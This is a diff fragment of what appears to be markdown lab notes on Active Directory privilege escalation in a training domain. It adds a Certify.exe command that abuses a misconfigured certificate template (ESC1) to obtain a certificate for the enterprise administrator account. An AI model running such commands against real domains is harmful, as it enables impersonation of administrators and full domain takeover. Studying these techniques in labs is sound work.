@@ -941,4 +941,13 @@ We should now have access to DC as domain admin
 
 **Escalation to Enterprise Admin**
 
-We can also go ahead and collect certi
+We can also go ahead and collect both the `Private Key` and `Certificates` for `mcorp-dc`
+
+
+```powershell
+Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
+```
+
+- save output as usual into notepad and save with extension `"esc1-EA.pem"`
+
+
